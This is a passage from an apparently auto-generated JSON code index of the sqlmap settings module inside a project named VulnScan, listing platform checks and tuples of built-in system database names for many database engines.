\"SPATIAL_WFS_ADMIN_USR\", \"SYS\", \"SYSMAN\", \"SYSTEM\", \"TRACESVR\", \"TSMSYS\", \"WK_TEST\", \"WKPROXY\", \"WKSYS\", \"WMSYS\", \"XDB\", \"XS$NULL\")",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PYVERSION",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "PYVERSION = sys.version.split()[0]\nIS_WIN = PLATFORM == \"nt\"\n# Check if running in terminal\nIS_TTY = hasattr(sys.stdout, \"fileno\") and os.isatty(sys.stdout.fileno())\n# DBMS system databases\nMSSQL_SYSTEM_DBS = (\"Northwind\", \"master\", \"model\", \"msdb\", \"pubs\", \"tempdb\", \"Resource\", \"ReportServer\", \"ReportServerTempDB\")\nMYSQL_SYSTEM_DBS = (\"information_schema\", \"mysql\", \"performance_schema\", \"sys\")\nPGSQL_SYSTEM_DBS = (\"information_schema\", \"pg_catalog\", \"pg_toast\", \"pgagent\")\nORACLE_SYSTEM_DBS = (\"ADAMS\", \"ANONYMOUS\", \"APEX_030200\", \"APEX_PUBLIC_USER\", \"APPQOSSYS\", \"AURORA$ORB$UNAUTHENTICATED\", \"AWR_STAGE\", \"BI\", \"BLAKE\", \"CLARK\", \"CSMIG\", \"CTXSYS\", \"DBSNMP\", \"DEMO\", \"DIP\", \"DMSYS\", \"DSSYS\", \"EXFSYS\", \"FLOWS_%\", \"FLOWS_FILES\", \"HR\", \"IX\", \"JONES\", \"LBACSYS\", \"MDDATA\", \"MDSYS\", \"MGMT_VIEW\", \"OC\", \"OE\", \"OLAPSYS\", \"ORACLE_OCM\", \"ORDDATA\", \"ORDPLUGINS\", \"ORDSYS\", \"OUTLN\", \"OWBSYS\", \"PAPER\", \"PERFSTAT\", \"PM\", \"SCOTT\", \"SH\", \"SI_INFORMTN_SCHEMA\", \"SPATIAL_CSW_ADMIN_USR\", \"SPATIAL_WFS_ADMIN_USR\", \"SYS\", \"SYSMAN\", \"SYSTEM\", \"TRACESVR\", \"TSMSYS\", \"WK_TEST\", \"WKPROXY\", \"WKSYS\", \"WMSYS\", \"XDB\", \"XS$NULL\")\nSQLITE_SYSTEM_DBS = (\"sqlite_master\", \"sqlite_temp_master\")",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "IS_WIN",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "IS_WIN = PLATFORM == \"nt\"\n# Check if running in terminal\nIS_TTY = hasattr(sys.stdout, \"fileno\") and os.isatty(sys.stdout.fileno())\n# DBMS system databases\nMSSQL_SYSTEM_DBS = (\"Northwind\", \"master\", \"model\", \"msdb\", \"pubs\", \"tempdb\", \"Resource\", \"ReportServer\", \"ReportServerTempDB\")\nMYSQL_SYSTEM_DBS = (\"information_schema\", \"mysql\", \"performance_schema\", \"sys\")\nPGSQL_SYSTEM_DBS = (\"information_schema\", \"pg_catalog\", \"pg_toast\", \"pgagent\")\nORACLE_SYSTEM_DBS = (\"ADAMS\", \"ANONYMOUS\", \"APEX_030200\", \"APEX_PUBLIC_USER\", \"APPQOSSYS\", \"AURORA$ORB$UNAUTHENTICATED\", \"AWR_STAGE\", \"BI\", \"BLAKE\", \"CLARK\", \"CSMIG\", \"CTXSYS\", \"DBSNMP\", \"DEMO\", \"DIP\", \"DMSYS\", \"DSSYS\", \"EXFSYS\", \"FLOWS_%\", \"FLOWS_FILES\", \"HR\", \"IX\", \"JONES\", \"LBACSYS\", \"MDDATA\", \"MDSYS\", \"MGMT_VIEW\", \"OC\", \"OE\", \"OLAPSYS\", \"ORACLE_OCM\", \"ORDDATA\", \"ORDPLUGINS\", \"ORDSYS\", \"OUTLN\", \"OWBSYS\", \"PAPER\", \"PERFSTAT\", \"PM\", \"SCOTT\", \"SH\", \"SI_INFORMTN_SCHEMA\", \"SPATIAL_CSW_ADMIN_USR\", \"SPATIAL_WFS_ADMIN_USR\", \"SYS\", \"SYSMAN\", \"SYSTEM\", \"TRACESVR\", \"TSMSYS\", \"WK_TEST\", \"WKPROXY\", \"WKSYS\", \"WMSYS\", \"XDB\", \"XS$NULL\")\nSQLITE_SYSTEM_DBS = (\"sqlite_master\", \"sqlite_temp_master\")\nACCESS_SYSTEM_DBS = (\"MSysAccessObjects\", \"MSysACEs\", \"MSysObjects\", \"MSysQueries\", \"MSysRelationships\", \"MSysAccessStorage\", \"MSysAccessXML\", \"MSysModules\", \"MSysModules2\")",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "IS_TTY",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "IS_TTY = hasattr(sys.stdout, \"fileno\") and os.isatty(sys.stdout.fileno())\n# DBMS system databases\nMSSQL_SYSTEM_DBS = (\"Northwind\", \"master\", \"model\", \"msdb\", \"pubs\", \"tempdb\", \"Resource\", \"ReportServer\", \"ReportServerTempDB\")\nMYSQL_SYSTEM_DBS = (\"information_schema\", \"mysql\", \"performance_schema\", \"sys\")\nPGSQL_SYSTEM_DBS = (\"information_schema\", \"pg_catalog\", \"pg_toast\", \"pgagent\")\nORACLE_SYSTEM_DBS = (\"ADAMS\", \"ANONYMOUS\", \"APEX_030200\", \"APEX_PUBLIC_USER\", \"APPQOSSYS\", \"AURORA$ORB$UNAUTHENTICATED\", \"AWR_STAGE\", \"BI\", \"BLAKE\", \"CLARK\", \"CSMIG\", \"CTXSYS\", \"DBSNMP\", \"DEMO\", \"DIP\", \"DMSYS\", \"DSSYS\", \"EXFSYS\", \"FLOWS_%\", \"FLOWS_FILES\", \"HR\", \"IX\", \"JONES\", \"LBACSYS\", \"MDDATA\", \"MDSYS\", \"MGMT_VIEW\", \"OC\", \"OE\", \"OLAPSYS\", \"ORACLE_OCM\", \"ORDDATA\", \"ORDPLUGINS\", \"ORDSYS\", \"OUTLN\", \"OWBSYS\", \"PAPER\", \"PERFSTAT\", \"PM\", \"SCOTT\", \"SH\", \"SI_INFORMTN_SCHEMA\", \"SPATIAL_CSW_ADMIN_USR\", \"SPATIAL_WFS_ADMIN_USR\", \"SYS\", \"SYSMAN\", \"SYSTEM\", \"TRACESVR\", \"TSMSYS\", \"WK_TEST\", \"WKPROXY\", \"WKSYS\", \"WMSYS\", \"XDB\", \"XS$NULL\")\nSQLITE_SYSTEM_DBS = (\"sqlite_master\", \"sqlite_temp_master\")\nACCESS_SYSTEM_DBS = (\"MSysAccessObjects\", \"MSysACEs\", \"MSysObjects\", \"MSysQueries\", \"MSysRelationships\", \"MSysAccessStorage\", \"MSysAccessXML\", \"MSysModules\", \"MSysModules2\")\nFIREBIRD_SYSTEM_DBS = (\"RDB$BACKUP_HISTORY\", \"RDB$CHARACTER_SETS\", \"RDB$CHECK_CONSTRAINTS\", \"RDB$COLLATIONS\", \"RDB$DATABASE\", \"RDB$DEPENDENCIES\", \"RDB$EXCEPTIONS\", \"RDB$FIELDS\", \"RDB$FIELD_DIMENSIONS\", \" RDB$FILES\", \"RDB$FILTERS\", \"RDB$FORMATS\", \"RDB$FUNCTIONS\", \"RDB$FUNCTION_ARGUMENTS\", \"RDB$GENERATORS\", \"RDB$INDEX_SEGMENTS\", \"RDB$INDICES\", \"RDB$LOG_FILES\", \"RDB$PAGES\", \"RDB$PROCEDURES\", \"RDB$PROCEDURE_PARAMETERS\", \"RDB$REF_CONSTRAINTS\", \"RDB$RELATIONS\", \"RDB$RELATION_CONSTRAINTS\", \"RDB$RELATION_FIELDS\", \"RDB$ROLES\", \"RDB$SECURITY_CLASSES\", \"RDB$TRANSACTIONS\", \"RDB$TRIGGERS\", \"RDB$TRIGGER_MESSAGES\", \"RDB$TYPES\", \"RDB$USER_PRIVILEGES\", \"RDB$VIEW_RELATIONS\")\nMAXDB_SYSTEM_DBS = (\"SYSINFO\", \"DOMAIN\")",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MSSQL_SYSTEM_DBS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "MSSQL_SYSTEM_DBS = (\"Northwind\", \"master\", \"model\", \"msdb\", \"pubs\", \"tempdb\", \"Resource\", \"ReportServer\", \"ReportServerTempDB\")\nMYSQL_SYSTEM_DBS = (\"information_schema\", \"mysql\", \"performance_schema\", \"sys\")\nPGSQL_SYSTEM_DBS = (\"information_schema\", \"pg_catalog\", \"pg_toast\", \"pgagent\")\nORACLE_SYSTEM_DBS = (\"ADAMS\", \"ANONYMOUS\", \"APEX_030200\", \"APEX_PUBLIC_USER\", \"APPQOSSYS\", \"AURORA$ORB$UNAUTHENTICATED\", \"AWR_STAGE\", \"BI\", \"BLAKE\", \"CLARK\", \"CSMIG\", \"CTXSYS\", \"DBSNMP\", \"DEMO\", \"DIP\", \"DMSYS\", \"DSSYS\", \"EXFSYS\", \"FLOWS_%\", \"FLOWS_FILES\", \"HR\", \"IX\", \"JONES\", \"LBACSYS\", \"MDDATA\", \"MDSYS\", \"MGMT_VIEW\", \"OC\", \"OE\", \"OLAPSYS\", \"ORACLE_OCM\", \"ORDDATA\", \"ORDPLUGINS\", \"ORDSYS\", \"OUTLN\", \"OWBSYS\", \"PAPER\", \"PERFSTAT\", \"PM\", \"SCOTT\", \"SH\", \"SI_INFORMTN_SCHEMA\", \"SPATIAL_CSW_ADMIN_USR\", \"SPATIAL_WFS_ADMIN_USR\", \"SYS\", \"SYSMAN\", \"SYSTEM\", \"TRACESVR\", \"TSMSYS\", \"WK_TEST\", \"WKPROXY\", \"WKSYS\", \"WMSYS\", \"XDB\", \"XS$NULL\")\nSQLITE_SYSTEM_DBS = (\"sqlite_master\", \"sqlite_temp_master\")\nACCESS_SYSTEM_DBS = (\"MSysAccessObjects\", \"MSysACEs\", \"MSysObjects\", \"MSysQueries\", \"MSysRelationships\", \"MSysAccessStorage\", \"MSysAccessXML\", \"MSysModules\", \"MSysModules2\")\nFIREBIRD_SYSTEM_DBS = (\"RDB$BACKUP_HISTORY\", \"RDB$CHARACTER_SETS\", \"RDB$CHECK_CONSTRAINTS\", \"RDB$COLLATIONS\", \"RDB$DATABASE\", \"RDB$DEPENDENCIES\", \"RDB$EXCEPTIONS\", \"RDB$FIELDS\", \"RDB$FIELD_DIMENSIONS\", \" RDB$FILES\", \"RDB$FILTERS\", \"RDB$FORMATS\", \"RDB$FUNCTIONS\", \"RDB$FUNCTION_ARGUMENTS\", \"RDB$GENERATORS\", \"RDB$INDEX_SEGMENTS\", \"RDB$INDICES\", \"RDB$LOG_FILES\", \"RDB$PAGES\", \"RDB$PROCEDURES\", \"RDB$PROCEDURE_PARAMETERS\", \"RDB$REF_CONSTRAINTS\", \"RDB$RELATIONS\", \"RDB$RELATION_CONSTRAINTS\", \"RDB$RELATION_FIELDS\", \"RDB$ROLES\", \"RDB$SECURITY_CLASSES\", \"RDB$TRANSACTIONS\", \"RDB$TRIGGERS\", \"RDB$TRIGGER_MESSAGES\", \"RDB$TYPES\", \"RDB$USER_PRIVILEGES\", \"RDB$VIEW_RELATIONS\")\nMAXDB_SYSTEM_DBS = (\"SYSINFO\", \"DOMAIN\")\nSYBASE_SYSTEM_DBS = (\"master\", \"model\", \"sybsystemdb\", \"sybsystemprocs\")\nDB2_SYSTEM_DBS = (\"NULLID\", \"SQLJ\", \"SYSCAT\", \"SYSFUN\", \"SYSIBM\", \"SYSIBMADM\", \"SYSIBMINTERNAL\", \"SYSIBMTS\", \"SYSPROC\", \"SYSPUBLIC\", \"SYSSTAT\", \"SYSTOOLS\")",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MYSQL_SYSTEM_DBS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "MYSQL_SYSTEM_DBS = (\"information_schema\", \"mysql\", \"performance_schema\", \"sys\")\nPGSQL_SYSTEM_DBS = (\"information_schema\", \"pg_catalog\", \"pg_toast\", \"pgagent\")\nORACLE_SYSTEM_DBS = (\"ADAMS\", \"ANONYMOUS\", \"APEX_030200\", \"APEX_PUBLIC_USER\", \"APPQOSSYS\", \"AURORA$ORB$UNAUTHENTICATED\", \"AWR_STAGE\", \"BI\", \"BLAKE\", \"CLARK\", \"CSMIG\", \"CTXSYS\", \"DBSNMP\", \"DEMO\", \"DIP\", \"DMSYS\", \"DSSYS\", \"EXFSYS\", \"FLOWS_%\", \"FLOWS_FILES\", \"HR\", \"IX\", \"JONES\", \"LBACSYS\", \"MDDATA\", \"MDSYS\", \"MGMT_VIEW\", \"OC\", \"OE\", \"OLAPSYS\", \"ORACLE_OCM\", \"ORDDATA\", \"ORDPLUGINS\", \"ORDSYS\", \"OUTLN\", \"OWBSYS\", \"PAPER\", \"PERFSTAT\", \"PM\", \"SCOTT\", \"SH\", \"SI_INFORMTN_SCHEMA\", \"SPATIAL_CSW_ADMIN_USR\", \"SPATIAL_WFS_ADMIN_USR\", \"SYS\", \"SYSMAN\", \"SYSTEM\", \"TRACESVR\", \"TSMSYS\", \"WK_TEST\", \"WKPROXY\", \"WKSYS\", \"WMSYS\", \"XDB\", \"XS$NULL\")\nSQLITE_SYSTEM_DBS = (\"sqlite_master\", \"sqlite_temp_master\")\nACCESS_SYSTEM_DBS = (\"MSysAccessObjects\", \"MSysACEs\", \"MSysObjects\", \"MSysQueries\", \"MSysRelationships\", \"MSysAccessStorage\", \"MSysAccessXML\", \"MSysModules\", \"MSysModules2\")\nFIREBIRD_SYSTEM_DBS = (\"RDB$BACKUP_HISTORY\", \"RDB$CHARACTER_SETS\", \"RDB$CHECK_CONSTRAINTS\", \"RDB$COLLATIONS\", \"RDB$DATABASE\", \"RDB$DEPENDENCIES\", \"RDB$EXCEPTIONS\", \"RDB$FIELDS\", \"RDB$FIELD_DIMENSIONS\", \" RDB$FILES\", \"RDB$FILTERS\", \"RDB$FORMATS\", \"RDB$FUNCTIONS\", \"RDB$FUNCTION_ARGUMENTS\", \"RDB$GENERATORS\", \"RDB$INDEX_SEGMENTS\", \"RDB$INDICES\", \"RDB$LOG_FILES\", \"RDB$PAGES\", \"RDB$PROCEDURES\", \"RDB$PROCEDURE_PARAMETERS\", \"RDB$REF_CONSTRAINTS\", \"RDB$RELATIONS\", \"RDB$RELATION_CONSTRAINTS\", \"RDB$RELATION_FIELDS\", \"RDB$ROLES\", \"RDB$SECURITY_CLASSES\", \"RDB$TRANSACTIONS\", \"RDB$TRIGGERS\", \"RDB$TRIGGER_MESSAGES\", \"RDB$TYPES\", \"RDB$USER_PRIVILEGES\", \"RDB$VIEW_RELATIONS\")\nMAXDB_SYSTEM_DBS = (\"SYSINFO\", \"DOMAIN\")\nSYBASE_SYSTEM_DBS = (\"master\", \"model\", \"sybsystemdb\", \"sybsystemprocs\")\nDB2_SYSTEM_DBS = (\"NULLID\", \"SQLJ\", \"SYSCAT\", \"SYSFUN\", \"SYSIBM\", \"SYSIBMADM\", \"SYSIBMINTERNAL\", \"SYSIBMTS\", \"SYSPROC\", \"SYSPUBLIC\", \"SYSSTAT\", \"SYSTOOLS\")\nHSQLDB_SYSTEM_DBS = (\"INFORMATION_SCHEMA\", \"SYSTEM_LOB\")",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PGSQL_SYSTEM_DBS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "PGSQL_SYSTEM_DBS = (\"information_schema\", \"pg_catalog\", \"pg_toast\", \"pgagent\")\nORACLE_SYSTEM_DBS = (\"ADAMS\", \"ANONYMOUS\", \"APEX_030200\", \"APEX_PUBLIC_USER\", \"APPQOSSYS\", \"AURORA$ORB$UNAUTHENTICATED\", \"AWR_STAGE\", \"BI\", \"BLAKE\", \"CLARK\", \"CSMIG\", \"CTXSYS\", \"DBSNMP\", \"DEMO\", \"DIP\", \"DMSYS\", \"DSSYS\", \"EXFSYS\", \"FLOWS_%\", \"FLOWS_FILES\", \"HR\", \"IX\", \"JONES\", \"LBACSYS\", \"MDDATA\", \"MDSYS\", \"MGMT_VIEW\", \"OC\", \"OE\", \"OLAPSYS\", \"ORACLE_OCM\", \"ORDDATA\", \"ORDPLUGINS\", \"ORDSYS\", \"OUTLN\", \"OWBSYS\", \"PAPER\", \"PERFSTAT\", \"PM\", \"SCOTT\", \"SH\", \"SI_INFORMTN_SCHEMA\", \"SPATIAL_CSW_ADMIN_USR\", \"SPATIAL_WFS_ADMIN_USR\", \"SYS\", \"SYSMAN\", \"SYSTEM\", \"TRACESVR\", \"TSMSYS\", \"WK_TEST\", \"WKPROXY\", \"WKSYS\", \"WMSYS\", \"XDB\", \"XS$NULL\")\nSQLITE_SYSTEM_DBS = (\"sqlite_master\", \"sqlite_temp_master\")\nACCESS_SYSTEM_DBS = (\"MSysAccessObjects\", \"MSysACEs\", \"MSysObjects\", \"MSysQueries\", \"MSysRelationships\", \"MSysAccessStorage\", \"MSysAccessXML\", \"MSysModules\", \"MSysModules2\")\nFIREBIRD_SYSTEM_DBS = (\"RDB$BACKUP_HISTORY\", \"RDB$CHARACTER_SETS\", \"RDB$CHECK_CONSTRAINTS\", \"RDB$COLLATIONS\", \"RDB$DATABASE\", \"RDB$DEPENDENCIES\", \"RDB$EXCEPTIONS\", \"RDB$FIELDS\", \"RDB$FIELD_DIMENSIONS\", \" RDB$FILES\", \"RDB$FILTERS\", \"RDB$FORMATS\", \"RDB$FUNCTIONS\", \"RDB$FUNCTION_ARGUMENTS\", \"RDB$GENERATORS\", \"RDB$INDEX_SEGMENTS\", \"RDB$INDICES\", \"RDB$LOG_FILES\", \"RDB$PAGES\", \"RDB$PROCEDURES\", \"RDB$PROCEDURE_PARAMETERS\", \"RDB$REF_CONSTRAINTS\", \"RDB$RELATIONS\", \"RDB$RELATION_CONSTRAINTS\", \"RDB$RELATION_FIELDS\", \"RDB$ROLES\", \"RDB$SECURITY_CLASSES\", \"RDB$TRANSACTIONS\", \"RDB$TRIGGERS\", \"RDB$TRIGGER_MESSAGES\", \"RDB$TYPES\", \"RDB$USER_PRIVILEGES\", \"RDB$VIEW_RELATIONS\")\nMAXDB_SYSTEM_DBS = (\"SYSINFO\", \"DOMAIN\")\nSYBASE_SYSTEM_DBS = (\"master\", \"model\", \"sybsystemdb\", \"sybsystemprocs\")\nDB2_SYSTEM_DBS = (\"NULLID\", \"SQLJ\", \"SYSCAT\", \"SYSFUN\", \"SYSIBM\", \"SYSIBMADM\", \"SYSIBMINTERNAL\", \"SYSIBMTS\", \"SYSPROC\", \"SYSPUBLIC\", \"SYSSTAT\", \"SYSTOOLS\")\nHSQLDB_SYSTEM_DBS = (\"INFORMATION_SCHEMA\", \"SYSTEM_LOB\")\nH2_SYSTEM_DBS = (\"INFORMATION_SCHEMA\",) + (\"IGNITE\", \"ignite-sys-cache\")",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "ORACLE_SYSTEM_DBS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "ORACLE_SYSTEM_DBS = (\"ADAMS\", \"ANONYMOUS\", \"APEX_030200\", \"APEX_PUBLIC_USER\", \"APPQOSSYS\", \"AURORA$ORB$UNAUTHENTICATED\", \"AWR_STAGE\", \"BI\", \"BLAKE\", \"CLARK\", \"CSMIG\", \"CTXSYS\", \"DBSNMP\", \"DEMO\", \"DIP\", \"DMSYS\", \"DSSYS\", \"EXFSYS\", \"FLOWS_%\", \"FLOWS_FILES\", \"HR\", \"IX\", \"JONES\", \"LBACSYS\", \"MDDATA\", \"MDSYS\", \"MGMT_VIEW\", \"OC\", \"OE\", \"OLAPSYS\", \"ORACLE_OCM\", \"ORDDATA\", \"ORDPLUGINS\", \"ORDSYS\", \"OUTLN\", \"OWBSYS\", \"PAPER\", \"PERFSTAT\", \"PM\", \"SCOTT\", \"SH\", \"SI_INFORMTN_SCHEMA\", \"SPATIAL_CSW_ADMIN_USR\", \"SPATIAL_WFS_ADMIN_USR\", \"SYS\", \"SYSMAN\", \"SYSTEM\", \"TRACESVR\", \"TSMSYS\", \"WK_TEST\", \"WKPROXY\", \"WKSYS\", \"WMSYS\", \"XDB\", \"XS$NULL\")\nSQLITE_SYSTEM_DBS = (\"sqlite_master\", \"sqlite_temp_master\")\nACCESS_SYSTEM_DBS = (\"MSysAccessObjects\", \"MSysACEs\", \"MSysObjects\", \"MSysQueries\", \"MSysRelationships\", \"MSysAccessStorage\", \"MSysAccessXML\", \"MSysModules\", \"MSysModules2\")\nFIREBIRD_SYSTEM_DBS = (\"RDB$BACKUP_HISTORY\", \"RDB$CHARACTER_SETS\", \"RDB$CHECK_CONSTRAINTS\", \"RDB$COLLATIONS\", \"RDB$DATABASE\", \"RDB$DEPENDENCIES\", \"RDB$EXCEPTIONS\", \"RDB$FIELDS\", \"RDB$FIELD_DIMENSIONS\", \" RDB$FILES\", \"RDB$FILTERS\", \"RDB$FORMATS\", \"RDB$FUNCTIONS\", \"RDB$FUNCTION_ARGUMENTS\", \"RDB$GENERATORS\", \"RDB$INDEX_SEGMENTS\", \"RDB$INDICES\", \"RDB$LOG_FILES\", \"RDB$PAGES\", \"RDB$PROCEDURES\", \"RDB$PROCEDURE_PARAMETERS\", \"RDB$REF_CONSTRAINTS\", \"RDB$RELATIONS\", \"RDB$RELATION_CONSTRAINTS\", \"RDB$RELATION_FIELDS\", \"RDB$ROLES\", \"RDB$SECURITY_CLASSES\", \"RDB$TRANSACTIONS\", \"RDB$TRIGGERS\", \"RDB$TRIGGER_MESSAGES\", \"RDB$TYPES\", \"RDB$USER_PRIVILEGES\", \"RDB$VIEW_RELATIONS\")\nMAXDB_SYSTEM_DBS = (\"SYSINFO\", \"DOMAIN\")\nSYBASE_SYSTEM_DBS = (\"master\", \"model\", \"sybsystemdb\", \"sybsystemprocs\")\nDB2_SYSTEM_DBS = (\"NULLID\", \"SQLJ\", \"SYSCAT\", \"SYSFUN\", \"SYSIBM\", \"SYSIBMADM\", \"SYSIBMINTERNAL\", \"SYSIBMTS\", \"SYSPROC\", \"SYSPUBLIC\", \"SYSSTAT\", \"SYSTOOLS\")\nHSQLDB_SYSTEM_DBS = (\"INFORMATION_SCHEMA\", \"SYSTEM_LOB\")\nH2_SYSTEM_DBS = (\"INFORMATION_SCHEMA\",) + (\"IGNITE\", \"ignite-sys-cache\")\nINFORMIX_SYSTEM_DBS = (\"sysmaster\", \"sysutils\", \"sysuser\", \"sysadmin\")",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SQLITE_SYSTEM_DBS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "SQLITE_SYSTEM_DBS = (\"sqlite_master\", \"sqlite_temp_master\")\nACCESS_SYSTEM_DBS = (\"MSysAccessObjects\", \"MSysACEs\", \"MSysObjects\", \"MSysQueries\", \"MSysRelationships\", \"MSysAccessStorage\", \"MSysAccessXML\", \"MSysModules\", \"MSysModules2\")\nFIREBIRD_SYSTEM_DBS = (\"RDB$BACKUP_HISTORY\", \"RDB$CHARACTER_SETS\", \"RDB$CHECK_CONSTRAINTS\", \"RDB$COLLATIONS\", \"RDB$DATABASE\", \"RDB$DEPENDENCIES\", \"RDB$EXCEPTIONS\", \"RDB$FIELDS\", \"RDB$FIELD_DIMENSIONS\", \" RDB$FILES\", \"RDB$FILTERS\", \"RDB$FORMATS\", \"RDB$FUNCTIONS\", \"RDB$FUNCTION_ARGUMENTS\", \"RDB$GENERATORS\", \"RDB$INDEX_SEGMENTS\", \"RDB$INDICES\", \"RDB$LOG_FILES\", \"RDB$PAGES\", \"RDB$PROCEDURES\", \"RDB$PROCEDURE_PARAMETERS\", \"RDB$REF_CONSTRAINTS\", \"RDB$RELATIONS\", \"RDB$RELATION_CONSTRAINTS\", \"RDB$RELATION_FIELDS\", \"RDB$ROLES\", \"RDB$SECURITY_CLASSES\", \"RDB$TRANSACTIONS\", \"RDB$TRIGGERS\", \"RDB$TRIGGER_MESSAGES\", \"RDB$TYPES\", \"RDB$USER_PRIVILEGES\", \"RDB$VIEW_RELATIONS\")\nMAXDB_SYSTEM_DBS = (\"SYSINFO\", \"DOMAIN\")\nSYBASE_SYSTEM_DBS = (\"master\", \"model\", \"sybsystemdb\", \"sybsystemprocs\")\nDB2_SYSTEM_DBS = (\"NULLID\", \"SQLJ\", \"SYSCAT\", \"SYSFUN\", \"SYSIBM\", \"SYSIBMADM\", \"SYSIBMINTERNAL\", \"SYSIBMTS\", \"SYSPROC\", \"SYSPUBLIC\", \"SYSSTAT\", \"SYSTOOLS\")\nHSQLDB_SYSTEM_DBS = (\"INFORMATION_SCHEMA\", \"SYSTEM_LOB\")\nH2_SYSTEM_DBS = (\"INFORMATION_SCHEMA\",) + (\"IGNITE\", \"ignite-sys-cache\")\nINFORMIX_SYSTEM_DBS = (\"sysmaster\", \"sysutils\", \"sysuser\", \"sysadmin\")\nMONETDB_SYSTEM_DBS = (\"tmp\", \"json\", \"profiler\")",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "ACCESS_SYSTEM_DBS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "ACCESS_SYSTEM_DBS = (\"MSysAccessObjects\", \"MSysACEs\", \"MSysObjects\", \"MSysQueries\", \"MSysRelationships\", \"MSysAccessStorage\", \"MSysAccessXML\", \"MSysModules\", \"MSysModules2\")\nFIREBIRD_SYSTEM_DBS = (\"RDB$BACKUP_HISTORY\", \"RDB$CHARACTER_SETS\", \"RDB$CHECK_CONSTRAINTS\", \"RDB$COLLATIONS\", \"RDB$DATABASE\", \"RDB$DEPENDENCIES\", \"RDB$EXCEPTIONS\", \"RDB$FIELDS\", \"RDB$FIELD_DIMENSIONS\", \" RDB$FILES\", \"RDB$FILTERS\", \"RDB$FORMATS\", \"RDB$FUNCTIONS\", \"RDB$FUNCTION_ARGUMENTS\", \"RDB$GENERATORS\", \"RDB$INDEX_SEGMENTS\", \"RDB$INDICES\", \"RDB$LOG_FILES\", \"RDB$PAGES\", \"RDB$PROCEDURES\", \"RDB$PROCEDURE_PARAMETERS\", \"RDB$REF_CONSTRAINTS\", \"RDB$RELATIONS\", \"RDB$RELATION_CONSTRAINTS\", \"RDB$RELATION_FIELDS\", \"RDB$ROLES\", \"RDB$SECURITY_CLASSES\", \"RDB$TRANSACTIONS\", \"RDB$TRIGGERS\", \"RDB$TRIGGER_MESSAGES\", \"RDB$TYPES\", \"RDB$USER_PRIVILEGES\", \"RDB$VIEW_RELATIONS\")\nMAXDB_SYSTEM_DBS = (\"SYSINFO\", \"DOMAIN\")\nSYBASE_SYSTEM_DBS = (\"master\", \"model\", \"sybsystemdb\", \"sybsystemprocs\")\nDB2_SYSTEM_DBS = (\"NULLID\", \"SQLJ\", \"SYSCAT\", \"SYSFUN\", \"SYSIBM\", \"SYSIBMADM\", \"SYSIBMINTERNAL\", \"SYSIBMTS\", \"SYSPROC\", \"SYSPUBLIC\", \"SYSSTAT\", \"SYSTOOLS\")\nHSQLDB_SYSTEM_DBS = (\"INFORMATION_SCHEMA\", \"SYSTEM_LOB\")\nH2_SYSTEM_DBS = (\"INFORMATION_SCHEMA\",) + (\"IGNITE\", \"ignite-sys-cache\")\nINFORMIX_SYSTEM_DBS = (\"sysmaster\", \"sysutils\", \"sysuser\", \"sysadmin\")\nMONETDB_SYSTEM_DBS = (\"tmp\", \"json\", \"profiler\")\nDERBY_SYSTEM_DBS = (\"NULLID\", \"SQLJ\", \"SYS\", \"SYSCAT\", \"SYSCS_DIAG\", \"SYSCS_UTIL\", \"SYSFUN\", \"SYSIBM\", \"SYSPROC\", \"SYSSTAT\")",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "FIREBIRD_SYSTEM_DBS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
